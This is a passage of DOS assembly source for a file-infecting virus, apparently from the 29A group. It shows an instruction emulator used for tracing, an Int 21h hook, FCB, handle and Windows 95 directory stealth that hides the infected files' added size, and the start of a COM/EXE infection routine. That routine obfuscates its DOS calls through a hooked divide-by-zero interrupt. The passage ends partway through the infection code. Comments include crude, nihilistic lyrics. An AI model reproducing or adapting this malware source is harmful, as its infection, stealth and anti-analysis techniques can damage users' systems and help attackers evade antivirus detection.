   @Scall:

           inc     byte ptr cs:[_theresacall]
           mov     ax,word ptr cs:[_ip]
           add     ax,3
           push    ax
           add     ax,word ptr [si+1]
           mov     word ptr cs:[_ip],ax
           pop     ax
           mov     es,word ptr cs:[_ss]
           sub     word ptr cs:[_sp],2
           mov     di,word ptr cs:[_sp]
           stosw
           jmp     get&exec_instruction

               ;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú
               ; FAR CALL instruction
               ;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-

   @Fcall:

           inc     byte ptr cs:[_theresacall]
           inc     si
           push    si
           mov     es,word ptr cs:[_ss]
           sub     word ptr cs:[_sp],4
           mov     di,word ptr cs:[_sp]
           movsd
           pop     si
           push    cs
           pop     es
           lea     di,[_ip]
           movsd

           jmp     get&exec_instruction


               ;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú
               ; Short IP jump...
               ;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-

   @Sjmp:                      ; Short jump to somewhere

           mov     ax,word ptr [si+1]
           add     ax,3
           add     word ptr cs:[_ip],ax ; Sets new IP address
           jmp     get&exec_instruction



               ;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú
               ; far jump instruction
               ;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-

   @Fjmp:

           inc     si
           lodsd
           mov     dword ptr cs:[_ip],eax

           jmp     get&exec_instruction


               ;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú
               ; conditional jumps
               ;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-

   @Jojmp:
           call    @getflags
           jo      @Njmp
           jmp     @bytes2

   @Jnojmp:                    ; Jump if not overflow
           call    @getflags
           jno     @Njmp
           jmp     @bytes2
   @Jbjmp:                     ; Jump if below
           call    @getflags
           jb      @Njmp
           jmp     @bytes2
   @Jnbjmp:                    ; Jump if not below
           call    @getflags
           jnb     @Njmp
           jmp     @bytes2
   @Jzjmp:                     ; Jump if zero
           call    @getflags
           jz      @Njmp
           jmp     @bytes2
   @Jnzjmp:                    ; Jump if not zero
           call    @getflags
           jnz     @Njmp
           jmp     @bytes2
   @Jbejmp:                    ; etc
           call    @getflags
           jbe     @Njmp
           jmp     @bytes2
   @Jajmp:
           call    @getflags
           ja      @Njmp
           jmp     @bytes2
   @Jsjmp:
           call    @getflags
           js      @Njmp
           jmp     @bytes2
   @Jnsjmp:
           call    @getflags
           jns     @Njmp
           jmp     @bytes2
   @Jpejmp:
           call    @getflags
           jpe     @Njmp
           jmp     @bytes2


               ;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú
               ; LOOPNZ instruction
               ;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-
   @Mloopnz:               ; Will jump if CX=1 ( to 0 ), or if Zero flag=1

           dec     word ptr cs:[_cx]       ; =0 ?
           jz      @@FinalLoop
           call    @getflags
           jz      @@FinalLoop             ; Zero ?

               ;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú
               ; short jump instruction ( inside )
               ;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-

   @Njmp:
           inc     si
           call    @Add_or_sub_IP
           jmp     get&exec_instruction


   @Jpojmp:
           call    @getflags
           jpo     @Njmp
           jmp     @bytes2
   @Jljmp:
           call    @getflags
           jl      @Njmp
           jmp     @bytes2
   @Jgejmp:
           call    @getflags
           jge     @Njmp
           jmp     @bytes2
   @Jlejmp:
           call    @getflags
           jle     @Njmp
           jmp     @bytes2
   @jgjmp:
           call    @getflags
           jg      @Njmp
           jmp     @bytes2
   @Mjcxz:
           cmp     word ptr cs:[_cx],0
           jz      @Njmp
           jmp     @@FinalLoop

               ;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú
               ; near jump emulation ( for some )
               ;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-

   @Add_or_sub_IP:
           xor     ax,ax
           lodsb
           cmp     al,80h
           jb      @Add_IP
           mov     dx,100h
           inc     al
           inc     al
           sub     dx,ax
           xor     dh,dh
           sub     word ptr cs:[_ip],dx
           ret
   @Add_IP:
           inc     ax
           inc     ax
           add     word ptr cs:[_ip],ax
           ret

               ;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú
               ; 0FFh instruction
               ;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-
   opcodeFFflag:   db 0
   @0FFh:

   ; 0ffh beggining instructions are handled on a different way than the
   ;others; as we see, 50% of this instructions cannot be emulated by the
   ;executor and need a special consideration: beeing 80h opcodes, a specific
   ;routine for each one would mean a quantity of bytes we don't have, nor
   ;want. So, this is solved by just debugging the next instruction on simple
   ;step mode, tracing; the instructions with 0ffh, anyway, do not represent
   ;any danger for the stability of the emulation even if they are just traced.

           mov     byte ptr cs:[opcodeFFflag],0

           mov     ax,3501h        ; Int1h
           int     21h
           push    es bx
           mov     ax,2501h
           push    ax

           mov     word ptr cs:[where2jump+2],ds

           cmp     byte ptr cs:[_pref],0
           jz      @@PrefijoNoPresente
           dec     si

   @@PrefijoNoPresente:


           mov     word ptr cs:[where2jump],si
           push    cs
           pop     ds
           lea     dx,@Debugging1
           int     21h


           push    offset @continue_tra

   @set_registers_emu:
           std
           lea     si,_flags
           mov     cx,10d
   push_em_shit:
           lodsw
           push    ax
           loop    push_em_shit
           cld
           call    pop_all_regs
           ret

   @continue_tra:
           mov     word ptr cs:[_ss2],ss
           mov     word ptr cs:[_sp2],sp

   cli

           pushf
           pop     ax
           or      ah,01h
           push    ax
           popf

           mov     ss,word ptr cs:[_ss]
           mov     sp,word ptr cs:[_sp]

           db 0eah

   where2jump:     dw      0,0

   @@replace:                  ; After execution is made.

           mov     ss,word ptr cs:[_ss2]
           mov     sp,word ptr cs:[_sp2]

           pushf
           pop     ax
           and     ah,0feh
           push    ax
           popf

           sti

   @retornodealla:
           pop     ax dx ds
           int     21h

           jmp     get&exec_instruction


   @Debugging1:

           push    es ds si ax

           mov     si,sp
           add     si,8
           push    ss
           pop     ds
           lodsw
           push    ax
           lodsw
           push    ax
           pop     ds si


           cmp     byte ptr cs:[opcodeFFflag],1
           jnz     @@Debno
           push    ss cs
           pop     es ds
           mov     si,sp
           add     si,08h

           lea     di,_ip
           movsd

           add     sp,0eh

           jmp     @@replace

   @@Debno:

           push    bx ax cs ds
           pop     ax bx
           cmp     ax,bx
           pop     ax bx
           jz      @@Deb2

   @@Deb1:
           mov     byte ptr cs:[opcodeFFflag],1
   @@Deb2:

           pop     ax si ds es

           iret


   ;-ú--ú-ú-ú--ú--ú-ú--úú-ú-úú-ú--ú-ú--ú-úú-ú-ú--ú-ú--ú-úú-ú-úú-ú-ú--ú-ú--ú-ú-ú-
   ;                       Instructions execution zone
   ;ú-ú--ú--ú-ú--ú-úú-ú--ú-úú-ú-úú-úúú-ú--ú-ú--ú--ú-ú--ú-ú--ú-úú-ú-ú--ú-úú-ú-ú--

   ejecuci¢n:

           call    push_all_regs

           push    cs
           pop     ds
           call    @set_registers_emu
           mov     word ptr cs:[_ss2],ss
           mov     word ptr cs:[_sp2],sp


   cli
           mov     ss,word ptr cs:[_ss]
           mov     sp,word ptr cs:[_sp]

           nop                             ; Neccesary nops ( prefixes+rep )
   execi:  db      6 dup (90h)             ; Six nops to place instruction
   cli

           mov     word ptr cs:[_ss],ss
           mov     word ptr cs:[_sp],sp
           mov     ss,word ptr cs:[_ss2]
           mov     sp,word ptr cs:[_sp2]
   sti

           call    push_all_regs       ; Store registers again
           push    cs
           pop     ds
           lea     di,[_ds]
           mov     cx,10d
   @store_regs_emu:
           pop     ax
           stosw
           loop    @store_regs_emu





           dec     byte ptr cs:[_csflag]
           jnz     @@_notCs
           push    word ptr cs:[_ds2]
           pop     word ptr cs:[_ds]
   @@_notCs:
           mov     byte ptr cs:[_csflag],0


           call    pop_all_regs
           jmp     get&exec_instruction

   ;*****************
   ;           Push & Pop Registers
   ;                   ******************

   push_all_regs:
                                  ; Pushes all registers
           pop     cs:word ptr [call_flag]   ;
           pushf
           push    bp di si dx cx bx ax es ds
           push    cs:word ptr [call_flag]
           ret

   pop_all_regs:
                                 ; Restores all registers

           pop     cs:word ptr [call_flag]
           pop     ds es ax bx cx dx si di bp
           popf
           push    cs:word ptr [call_flag]
           ret

   call_flag:      dw      0

   offset_table:

       dw  offset @variable1,  offset @variable1,  offset @variable1   ; 00h-02h
       dw  offset @variable1,  offset @bytes2,     offset @bytes3      ; 03h-05h
       dw  offset @pushstack,  offset @bytes1,     offset @variable1   ; 06h-08h
       dw  offset @variable1,  offset @variable1,  offset @variable1   ; 09h-0bh
       dw  offset @bytes2,     offset @bytes3,     offset @pushstack   ; 0ch-0eh
       dw  offset @bytes1                                              ; 0fh

       dw  offset @bytes1,     offset @bytes1,     offset @wrongkind   ; 60h-62h
       dw  offset @wrongkind,  offset @wrongkind,  offset @wrongkind   ; 63h-65h
       dw  offset @wrongkind,  offset @wrongkind,  offset @bytes3      ; 66h-68h
       dw  offset @wrongkind,  offset @wrongkind,  offset @wrongkind   ; 69h-6bh
       dw  offset @bytes1,     offset @bytes1,     offset @bytes1      ; 6ch-6eh
       dw  offset @bytes1                                              ; 6fh

       dw  offset @Jojmp,      offset @Jnojmp,     offset @Jbjmp       ; 70h-72h
       dw  offset @Jnbjmp,     offset @Jzjmp,      offset @Jnzjmp      ; 73h-75h
       dw  offset @Jbejmp,     offset @Jajmp,      offset @Jsjmp       ; 76h-78h
       dw  offset @Jnsjmp,     offset @Jpejmp,     offset @Jpojmp      ; 79h-7bh
       dw  offset @Jljmp,      offset @Jgejmp,     offset @Jlejmp      ; 7ch-7eh
       dw  offset @jgjmp                                               ; 7fh

       dw  offset @variable2,  offset @variable3,  offset @variable2   ; 80h-82h
       dw  offset @variable2,  offset @variable1,  offset @variable1   ; 83h-85h
       dw  offset @variable1,  offset @variable1,  offset @variable1   ; 86h-88h
       dw  offset @variable1,  offset @variable1,  offset @variable1   ; 89h-8bh
       dw  offset @variable1,  offset @variable1,  offset @variable1   ; 8ch-8eh
       dw  offset @variable1                                           ; 8fh

       dw  offset @bytes1,     offset @bytes1,     offset @bytes1      ; 90h-92h
       dw  offset @bytes1,     offset @bytes1,     offset @bytes1      ; 93h-95h
       dw  offset @bytes1,     offset @bytes1,     offset @bytes1      ; 96h-98h
       dw  offset @bytes1,     offset @Fcall,      offset @bytes1      ; 99h-9bh
       dw  offset @bytes1,     offset @bytes1,     offset @bytes1      ; 9ch-9eh
       dw  offset @bytes1                                              ; 9fh

       dw  offset @bytes3,     offset @bytes3,     offset @bytes3      ; a0h-a2h
       dw  offset @bytes3,     offset @bytes1,     offset @bytes1      ; a3h-a5h
       dw  offset @bytes1,     offset @bytes1,     offset @bytes2      ; a6h-a8h
       dw  offset @bytes3,     offset @bytes1,     offset @bytes1      ; a9h-abh
       dw  offset @bytes1,     offset @bytes1,     offset @bytes1      ; ach-aeh
       dw  offset @bytes1                                              ; afh

       dw  offset @bytes2,     offset @bytes2,     offset @bytes2      ; b0h-b2h
       dw  offset @bytes2,     offset @bytes2,     offset @bytes2      ; b3h-b5h
       dw  offset @bytes2,     offset @bytes2,     offset @bytes3      ; b6h-b8h
       dw  offset @bytes3,     offset @bytes3,     offset @bytes3      ; b9h-bbh
       dw  offset @bytes3,     offset @bytes3,     offset @bytes3      ; bch-beh
       dw  offset @bytes3                                              ; bfh

       dw  offset @variable2,  offset @variable2,  offset @RetNum      ; c0h-c2h
       dw  offset @RetKind,    offset @variable1,  offset @variable1   ; c3h-c5h
       dw  offset @variable2,  offset @variable3,  offset @wrongkind   ; c6h-c8h
       dw  offset @wrongkind,  offset @RetfNum,    offset @RetfKind    ; c9h-cbh
       dw  offset @bytes1,     offset @interrupt,  offset @bytes1      ; cch-ceh
       dw  offset @IretKind                                            ; cfh

       dw  offset @variable1,  offset @variable1,  offset @variable1   ; d0h-d2h
       dw  offset @variable1,  offset @bytes2,     offset @bytes2      ; d3h-d5h
       dw  offset @wrongkind,  offset @bytes1,     offset @variable1   ; d6h-d8h
       dw  offset @variable1,  offset @variable1,  offset @variable1   ; d9h-dbh
       dw  offset @variable1,  offset @variable1,  offset @variable1   ; dch-deh
       dw  offset @variable1

       dw  offset @MLoopnz,    offset @MLoopz,     offset @MLoop       ; e0h-e2h
       dw  offset @MJcxz,      offset @bytes2,     offset @bytes2      ; e3h-e5h
       dw  offset @bytes2,     offset @bytes2,     offset @SCall       ; e6h-e8h
       dw  offset @Sjmp,       offset @Fjmp,       offset @NJmp        ; e9h-ebh
       dw  offset @bytes1,     offset @bytes1,     offset @bytes1      ; ech-eeh
       dw  offset @bytes1                                              ; efh

       dw  offset @bytes1,     offset @wrongkind,  offset @@NotCsPrefix; f0h-f2h
       dw  offset @@NotCsPrefix, offset @bytes1,   offset @bytes1      ; f3h-f5h
       dw  offset @variable2,  offset @Variable3,  offset @bytes1      ; f6h-f8h
       dw  offset @bytes1,     offset @bytes1,     offset @bytes1      ; f9h-fbh
       dw  offset @bytes1,     offset @bytes1,     offset @0FEh        ; fch-feh
       dw  offset @0FFh



           ; **********************
           ; Opcodes for emulation
           ; **********************

   _csflag:db      0
   _ds2:   db      0
   _Pref:  db      0
   _ip:    dw      0
   _cs:    dw      0
   _ds:    dw      0
   _es:    dw      0
   _ax:    dw      0
   _bx:    dw      0
   _cx:    dw      0
   _dx:    dw      0
   _si:    dw      0
   _di:    dw      0
   _bp:    dw      0
   _flags: dw      0
   _ss:    dw      0
   _sp:    dw      0
   _ss2:   dw      0
   _sp2:   dw      0
   _stack: db      350d dup (00h)
   _endstack label byte
   _stack2: db     300d dup (00h)
   _endstack2 label byte

   _usemode:   dw  0
   _theresacall:  db  0





   ;****************************************************************************
   ;                           Diverse subroutines
   ;****************************************************************************


   check_dos_version:

           mov     ah,30h
           int     21h
           cmp     al,7d
           ret

   get_sft:
           push    bx
           mov     ax,1220h
           int     2fh
           jc      @@go_out
           xor     bx,bx
           mov     bl,byte ptr es:[di]
           mov     ax,1216h
           int     2fh             ; In ES:DI we get the Sft entry that
           clc
   @@go_out:
           pop     bx
           ret                     ;belongs to the actual file.



   rehandle:

           cld
           mov     di,word ptr cs:[jump_handle]        ; Place to handle
           mov     es,word ptr cs:[jump_handle+2]
           push    cs
           mov     al,0eah
           stosb
           mov     ax,offset int21handler
           stosw
           pop     ax
           stosw
           ret


   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;                              FCB Stealth
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ; He is the angel with the scabbed wings hard-drug face want to powder his
   ;nose. He will deflower the freshest crop dry up all the wombs with his
   ;rock and roll sores.
   ;

   fcb:
           call    pop_all_regs

           pushf                           ; The same old routine
           call    dword ptr cs:[Int21h]   ;for Fcb stealth ( nothing
           test    al,al                   ;new, aren't you bored
           jnz     nada_de_stealth         ;about this ones ? )
           call    push_all_regs

           mov     ah,51h
           int     21h
           mov     es,bx
           cmp     bx,es:[16h]
           jnz     Not_infected

           mov     bx,dx
           mov     al,byte ptr [bx]
           push    ax
           mov     ah,2fh
           int     21h
           pop     ax
           inc     al
           jnz     Normal_FCB
           add     bx,7h

   Normal_FCB:
           mov     al,es:[bx+17h]
           and     al,1eh
           xor     al,1eh
           jnz     Not_infected

           sub     word ptr es:[bx+1dh],Virus_size+200h
           sbb     word ptr es:[bx+1fh],0
           and     byte ptr es:[bx+17h],06bh

   Not_infected:

           call    pop_all_regs

   nada_de_stealth:

           mov     byte ptr cs:[InVirus],0
           cmp     word ptr cs:[int21h_plural],0
           jz      w95whit

           push    es di ax
           call    rehandle
           pop     ax di es
           mov     ss,word ptr cs:stack_old+2
           mov     sp,word ptr cs:stack_old

   w95whit:
           retf    2


   set_a_pair_values:
           mov     byte ptr cs:[_theresacall],1    ; Dos=HMA ?
           mov     word ptr cs:[_usemode],0201h    ;OPTIMIZE !!!
           call    Code_Emulator
           ret

   fuck_the_rules:
           push    ss
           pop     word ptr cs:[_ss]            ; Set stack
           mov     word ptr cs:[_sp],offset _endstack
           ret

   Strapping_Young_Lad:

           mov     ah,40h                      ; First 3 bytes
           mov     cx,3
           lea     dx,comjmp
           call    call_21h
           ret

   Smack_My_Bitch_UP:

           sub     ax,0ff00h
           mov     word ptr cs:[BP_Init],ax    ; Delta adjust
           mov     word ptr cs:[Another_BP],ax
           ret



   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;                              Int 21h handler
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ;  And I control you, guy. Total control. Sickness. Cold. Do you want to die
   ; with me today ?
   ;

   InVirus:
           db      0

   int21handler:

           mov     byte ptr cs:[InVirus],1
           cmp     ax,0cacah       ; Tsr check
           jnz     @Fale_ok

           cmp     esi,'_29A'
           jnz     @Fale_ok

           mov     esi,'RULZ'                  ; Original, isn't it ? :-P
           mov     byte ptr cs:[InVirus],0
           iret

   @Fale_ok:

           mov     word ptr cs:stack_old+2,ss
           mov     word ptr cs:stack_old,sp
           push    cs
           pop     ss
           mov     sp,offset _endstack2-2

           call    push_all_regs

           cld
           push    cs                  ; As if nothing happened in int21h
           pop     ds
           mov     es,word ptr cs:[jump_handle+2]
           mov     di,word ptr cs:[jump_handle]
           lea     si,saved21
           movsd
           movsb


           cmp     ax,04b00h
           jz      close_file
           cmp     ah,11h
           jz      fcb
           cmp     ah,12h
           jz      fcb
           cmp     ah,4eh
           jz      handle
           cmp     ah,4fh
           jz      handle

   We_finish_here_anyway:

           xor     ax,ax
           mov     es,ax
           push    cs

           mov     word ptr es:[0004h],offset Trace_01
           pop     word ptr es:[0006h]

           mov     byte ptr cs:[trace_flag],5d

   _HowMuch        equ     $-1         ; To set how much to trace

   finished:

           call    pop_all_regs

           push    ax
           pushf
           pop     ax                      ; Trap flag
           or      ah,01h
           push    ax
           popf
           pop     ax

           mov     ss,word ptr cs:stack_old+2
           mov     sp,word ptr cs:stack_old


   @Returnboy:

   jumper: db      0eah            ; call xxxx:yyyy
   jump_handle:dw      0,0
   saved21: db     10d dup (?)
   trace_off: dw   0,0

   Trace_01:

           call    push_all_regs

           mov     di,sp
           mov     ax,word ptr ss:[di+22d]
           push    cs
           pop     di
           sub     ax,di
           jz      Alacalleostias

           dec     byte ptr cs:[trace_flag]
           jnz     Alacalleostias          ; Done !

           call    rehandle

           call    pop_all_regs

           mov     word ptr cs:[_Ax],ax
           add     sp,4d
           pop     ax
           and     ah,0feh
           push    ax
           popf
           sub     sp,6d
           mov     ax,word ptr cs:[_Ax]
           mov     byte ptr cs:[InVirus],0

           iret

   Alacalleostias:

           call    pop_all_regs

           iret

   stack_old: dw 0,0
   Trace_flag: db 0


   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;                       ALTERNATE INT 21h HANDLER
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   Alternate_21_handler:

           cmp     ax,0cacah       ; Tsr check ( temporal )
           jnz     @NoTsrCheck
           cmp     esi,'_29A'
           jnz     @NoTsrCheck
           mov     esi,'RULZ'                  ; :-P
           iret

   tha_difference  equ not_W95-We_finish_here_anyway

   @NoTsrCheck:

           call    push_all_regs
           add     word ptr cs:[return_point],tha_difference
           xor     ax,029ah
           cmp     ax,4b00h xor 029ah  ; 4b00h xor 029ah
           jnz     not_inf_W95
           jmp     EXE_W95_Infect

   not_inf_W95:

           cmp     ax,714eh xor 029ah
           jz      W95_Stealth
           cmp     ax,714fh xor 029ah
           jz      W95_Stealth
           cmp     ah,4eh xor 02h
           jz      StealthHandle
           cmp     ah,4fh xor 02h
           jnz     not_W95
   StealthHandle:
           sub     word ptr cs:[return_point],tha_difference
           jmp     handle
   not_W95:
           cmp     ah,11h xor 02h
           jz      FCB_St
           cmp     ah,12h xor 02h
           jnz     not_FCB
   FCB_st:
           sub     word ptr cs:[return_point],tha_difference
           jmp     fcb
   not_FCB:

           sub     word ptr cs:[return_point],tha_difference
           call    pop_all_regs


           jmp     j21


   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;                            HANDLE STEALTH
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ; Nothing exists. Nothing has sense. Not nothing. Not a fuck. Fuck it.
   ;
   ; Fuck it off.
   ;

   handle:
           call    pop_all_regs

           pushf                           ; Handle stealth, functions
           call    dword ptr cs:[Int21h]   ;4eh/4fh. The most original
           jc      handle_out              ;routines in some viruses ;)
           pushf
           push    dx ax es bx di

           mov     ah,2fh
           int     21h
           mov     al,es:[bx+16h]
           and     al,1eh
           xor     al,1eh
           jnz     not_infec
           sub     word ptr es:[bx+1ah],Virus_size+200h
           sbb     word ptr es:[bx+1ch],0
           and     byte ptr es:[bx+16h],06bh
   not_infec:
           pop     di bx es ax dx
           popf

   handle_out:
           pushf
           mov     byte ptr cs:[InVirus],0
           cmp     word ptr cs:[int21h_plural],0
           jnz     No_Estamos_en_95
           popf
           retf    2

   No_Estamos_en_95:
           popf
           call    push_all_regs
           call    rehandle       ; REPONER CO¥O !
           call    pop_all_regs
           mov     ss,word ptr cs:stack_old+2
           mov     sp,word ptr cs:stack_old

   Estamos_en_95:
           retf    2


   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;                      Windows 95 Ms-Dos stealth
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   ;       Win95 stealth:
   ;
   ;       W95's Ms-Dos 7.0 performs the "dir" instruction by means of
   ; int21h's 714eh and 714fh functions ( FindFirst/FindNext ). Anyway, by
   ; the method this virus infects, it's just impossible to stealth directly
   ; there because we can't check if the virus is infected.
   ;
   ;       When FindFirst/FindNext functions are called, the results are
   ; beeing stored not in a DTA as usual in previous DOS versions, but in a
   ; W32_FIND_DATA structure. You can easily find a description from this,
   ; but really what we only care about is the place where the file length
   ; is stored, that's a DD in the offset 1ch and another in the offset 20h,
   ; beeing the second the Low DD of the file length and the first one the
   ; High DD of file length.
   ;
   ;       So, as 714e/f is called, the OS passes in ES:DI where this
   ; structure is. We can substract then the virus length to the offset 20h
   ; ( and sbb in 1ch, which wouldn't be really necesarry ); but how do we
   ; check the date if it's set to 61/62 seconds ?
   ;
   ;       We can't. Let's look at the offset of LastAccessTime, which is
   ; 0ch, or at the offset LastWriteTime, which is 14h. They have "FILETIME"
   ; format, that is, two DDs with Low and High filetime. The bad stuff is,
   ; it's stored in nanoseconds*10^2 from January 1, 1601 (!!!) as the
   ; documentation tells us. So, you should have noticed by now that then it's
   ; impossible to check if the seconds were set at a "strange" position, as
   ; it's stored in seconds^(-7) ! ( so where's the Y2K problem that W98 tells
   ; us is aware of ? )
   ;
   ;       Well, I made the easy "old dos" solution, which goes fast in a slow
   ; W95, and the most important, works perfect; just open the file, get the
   ; file time by 5700h funtion, and decrease in the W32_FIND_DATA the virus
   ; size if it's infected ;-).
   ;
   ;

   W95_Stealth:

           sub     word ptr cs:[return_point],tha_difference
           call    pop_all_regs
           pushf
           call    dword ptr cs:[int21h]

           call    push_all_regs

           push    es
           pop     ds
           mov     dx,di
           add     dx,2ch
           mov     ax,3d00h
           call    call_21h
           jc      dont_stealth_w95
           xchg    ax,bx

           xor     bp,bp
           mov     ax,5700h
           call    call_21h
           and     cl,1eh
           xor     cl,1eh
           jnz     close_stealth
           inc     bp

   close_stealth:
           mov     ah,03eh
           call    call_21h

                   ; The date is in EDX:EAX, in FILETIME format, that is,
                   ;in nanoseconds*100d, ( 1 nano = 10^(-9) )

           dec     bp
           jnz     dont_stealth_w95

                           ; Substract virus size

           sub     dword ptr es:[di+20h],virus_size+200h
           sbb     dword ptr es:[di+1eh],0

   dont_stealth_w95:

           call    pop_all_regs

           retf    2

   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;                             File infection
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ;   They say solution is seek and destroy. Ambition. You've gotta fight for
   ; their wealth, you've gotta compete against others,  you've  gotta  follow
   ; their dogmas; so, maybe one day they'll  get  you  to  their  Kingdom  of
   ; Nothing.
   ;
   ;   Have you wondered why their only desire is keeping you far away from the
   ; nonsense ?
   ;


   attak_file:

   close_file:

           push    offset @end_found

   front_door:

           in      al,40h
           mov     byte ptr cs:[outta_crypt],al


           mov     ax,3500h
           call    call_21h
           mov     word ptr cs:[int0h],bx
           mov     word ptr cs:[int0h+2],es

           mov     bp,0ad54h                ; Base pointer :PPPP mwahaha
           xor     ax,bp
           sub     ax,7354h
           push    cs
           pop     ds
           mov     dx,offset int0handler
           call    call_21h                ; 2500h

           xor     ax,bp                       ; 3524h
           add     ax,0acd0h
           push    bp
           xor     bp,bp
           div     bp
           mov     word ptr cs:[int24h],bx
           mov     word ptr cs:[int24h+2],es

           add     ax,0f000h                   ; 2524h
           mov     dx,offset int24handler
           div     bp
           pop     si
           add     ax,si
           add     ax,5290h
           mov     ds,word ptr cs:[int8h+2d]
           mov     dx,word ptr cs:[int8h]
           div     bp                          ; 2508

           pop     word ptr cs:[buffercom]
           call    pop_all_regs

           call    push_all_regs
           push    word ptr cs:[buffercom]

           mov     si,dx
   @find_end:                              ; Search for end of file name ( 0 )
           lodsb
           or      al,al
           jnz     @find_end
           ret

   int24handler:                           ; Why not here ? :-P
           mov     al,3
           iret
   int24h:
           dw      0,0

   @end_found:

           sub     si,4
           mov     bp,0ffffh
           mov     di,bp                   ; Later
           inc     di
           cmp     word ptr ds:[si],'OC'
           jz      @Likely_Com

   @Likely_Exe:
           cmp     word ptr ds:[si],'XE'
           jz      It_is_Xe
           jmp     end_infection
   It_is_Xe:
           inc     bp


   @Likely_Com:
           mov     si,09cd4h       ; AX
           mov     ax,si
           add     ax,0a02ch           ; 3d00h :-)
           div     di

           jc      end_infection
           xchg    ax,bx

           call    get_sft
           jc      end_infection

           push    cs
           pop     ds

           push    word ptr es:[di+04h]
           mov     byte ptr es:[di+04h],0      ; Attribs 2 zero
           mov     byte ptr es:[di+02h],2      ; Write/read mode
           mov     ax,word ptr es:[di+0dh]     ; Infection mark.
           mov     cx,01eh
           and     al,cl
           xor     al,cl
           jz      rest_attrs
           push    word ptr es:[di+0dh]
           push    word ptr es:[di+0fh]


   ;*Final_Check*

                       ; 1eh

           push    bp
           xor     ax,ax
           mov     bp,ax
           mov     ah,cl
           lea     dx,buffercom                ; ah = 3fh ( read 01ch bytes )
           add     ax,0de00h                   ; 0fch
           add     ax,04300h
           div     bp
           pop     bp

           xchg    si,dx                   ; Is it an exe header ?
           lodsw
           xor     ah,al
           xor     ah,('M' xor 'Z')
           jnz     @Non_Exe_Phile
           inc     bp
